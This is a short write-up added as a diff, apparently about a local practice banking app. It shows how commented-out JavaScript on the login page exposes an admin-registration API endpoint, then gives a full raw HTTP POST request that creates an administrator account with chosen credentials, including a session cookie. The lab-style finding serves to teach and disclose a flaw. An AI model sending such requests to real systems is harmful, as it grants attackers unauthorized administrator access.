@@ -1,0 +1,72 @@
+                     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+                      EXPOSURE OF SENSITIVE FUNCTS
+
+                                gabriel
+                     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+
+Table of Contents
+─────────────────
+
+1. source pages review
+2. send a POST request to this endpoint to creat Admin account
+
+
+1 source pages review
+═════════════════════
+
+  After a review of several secure-bank pages, at register page present
+  at login page ->
+
+  ┌────
+  │ 
+  │                     //$('.btnRegister').on('click', function (event) {
+  │                     //    $.ajax({
+  │                     //        type: "POST",
+  │                     //        url: "/api/Auth/RegisterAdmin",
+  │                     //        data: JSON.stringify({ "UserName": $('.UserEmail').val(), "Password": $('.Password').val() }),
+  │                     //        contentType: 'application/json',
+  │                     //        success: data => {
+  │                     //            console.log('SUCESSS');
+  │                     //            var parsedData = JSON.parse(data);
+  │                     //            if (parsedData.status == "ok") {
+  │                     //                $('.cd-popup4').addClass('is-visible');  //show popup
+  │                     //                setTimeout(function () {
+  │                     //                    window.location.href = "/Auth/Login";
+  │                     //                }, 8000)
+  │                     //            } else {
+  │                     //                console.log('ERROR1');
+  │                     //                $('.cd-popup3').addClass('is-visible');  //show popup
+  │ 
+  └────
+
+  which means there is an endpoint to register admins, that someone
+  ended up forgetting to comment
+
+
+2 send a POST request to this endpoint to creat Admin account
+═════════════════════════════════════════════════════════════
+
+  ┌────
+  │ POST /api/Auth/RegisterAdmin HTTP/1.1
+  │ Host: localhost:1337
+  │ sec-ch-ua: "Chromium";v="139", "Not;A=Brand";v="99"
+  │ sec-ch-ua-mobile: ?0
+  │ sec-ch-ua-platform: "Linux"
+  │ Accept-Language: en-US,en;q=0.9
+  │ Upgrade-Insecure-Requests: 1
+  │ User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+  │ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+  │ Sec-Fetch-Site: same-origin
+  │ Sec-Fetch-Mode: navigate
+  │ Sec-Fetch-User: ?1
+  │ Sec-Fetch-Dest: document
+  │ Referer: http://localhost:1337/PortalSearch?SearchString=e12e1
+  │ Accept-Encoding: gzip, deflate, br
+  │ Cookie: SessionId=YmllbEBtYWlsLmNvbQ%3D%3D%268ab6a252dedfcc7250be4bf143e6ea1de8fd5beddab53124c02ea55cf5d923c9%
+  │ Connection: keep-alive
+  │ Content-Type: application/json
+  │ Content-Length: 53
+  │ 
+  │ {"UserName": "lio@email.com", "Password": "password"}
+  └────
